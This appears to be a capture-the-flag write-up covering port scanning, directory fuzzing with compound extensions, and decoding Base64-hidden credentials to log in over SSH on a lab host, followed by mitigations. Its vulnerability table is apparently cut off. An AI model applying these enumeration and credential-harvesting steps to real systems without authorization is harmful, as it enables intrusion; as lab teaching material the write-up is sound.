> The CTF description says: *"el secreto del hito es la enumeración"*. That's not a hint — it's the entire solution. I spent a good while stuck here before realising standard fuzzing wasn't going to cut it.

## Recon

```bash
nmap -p- --open -sT -T3 -v -n TARGET_IP
nmap -sT -sC -sV -p 2222,8080 -v -n TARGET_IP
```

- **Port 2222 — SSH (OpenSSH 9.3)**
- **Port 8080 — HTTP (Apache 2.4.62 Unix).** The `(Unix)` tag suggests Alpine Linux — confirmed later on login.

---

## Enumeration — first pass

The root page is bare Apache default, 45 bytes. Time to fuzz.

```bash
gobuster dir -u http://TARGET_IP:8080 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 30 -x php,txt,html,bak,zip,tar,gz,old,conf,log,xml,json
```

Five results: `index.html`, `carts.html`, `ecard.html`, `creditcard.html`, `server-status` (403).

The HTML files contain raw `<?php ... ?>` served as plain text — no PHP interpreter loaded. **PHP-based RCE is off the table.**

`creditcard.html` lists three entries: `1) jude`, `2) lenny`, `3) admin`. Possible usernames.

At this point I was stuck. The results looked thin and nothing obvious jumped out. The CTF kept saying enumeration was the key but I'd already fuzzed with a medium wordlist. I didn't find anything useful.

---

## Enumeration — second pass

The problem was **compound extensions** like `.html.bak`. `dirb` handles these better:

```bash
dirb http://TARGET_IP:8080/ \
  /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt \
  -X .html,.html.bak,.html.old,.bak,.zip,.tar.gz,.tgz \
  -w -r -S -o dirb_imagine.txt
```

Two new files gobuster completely missed: `index.tgz` (240 bytes) and `xcart.tgz` (327 bytes). Real `.tgz` files are never that small.

---

## Exploitation

### Checking what these files actually are

```bash
curl -O http://TARGET_IP:8080/xcart.tgz
curl -O http://TARGET_IP:8080/index.tgz
file xcart.tgz index.tgz
```

Output: `HTML document, ASCII text` — **not compressed archives**. HTML files disguised with a `.tgz` extension. That's the CWE-538 vector.

### Following the credential chain — and hitting a dead end first

```bash
cat xcart.tgz
```

Two things: a string `MS$_12j:-=9` and a redirect URL with a Base64 filename.

I spent a few hours on `MS$_12j:-=9`. Tried it as SSH password for all three users, tried variations. Nothing worked. Eventually I realised it was a **decoy** — deliberately placed to waste time. The real path was the URL.

```bash
echo "Z290b3Bhc3M=" | base64 -d    # gotopass
curl -v "http://TARGET_IP:8080/Z290b3Bhc3M=.html"
# pass: QTRfJCEyQm5tZDMzamkyITpEVA==
echo "QTRfJCEyQm5tZDMzamkyITpEVA==" | base64 -d   # A4_$!2Bnmd33ji2!:DT
```

> Use double quotes around the URL — the shell can interpret `=` as an assignment otherwise.

Chain: disguised file → fake password decoy → Base64 URL → Base64 password. Real password: `A4_$!2Bnmd33ji2!:DT`.

### SSH — trying all candidate users

```bash
ssh -p 2222 jude@TARGET_IP   # A4_$!2Bnmd33ji2!:DT → works
ssh -p 2222 lenny@TARGET_IP  # fails — user doesn't exist
ssh -p 2222 admin@TARGET_IP  # fails — user doesn't exist
```

`lenny` and `admin` exist only to force systematic verification.

| V3 | Username enumeration via public content | CWE-522 | — |

## Mitigations

**V1:** Keep backups outside the document root. Block dangerous extensions:
```apache
<FilesMatch "\.(bak|old|tgz|tar\.gz|zip|swp|orig)$">
    Require all denied
</FilesMatch>
```
**V2:** Base64 is encoding, not encryption. Use secret managers and adaptive hashes (`argon2id`, `bcrypt`). **V3:** Remove real usernames from public content. Configure SSH to return generic error messages.
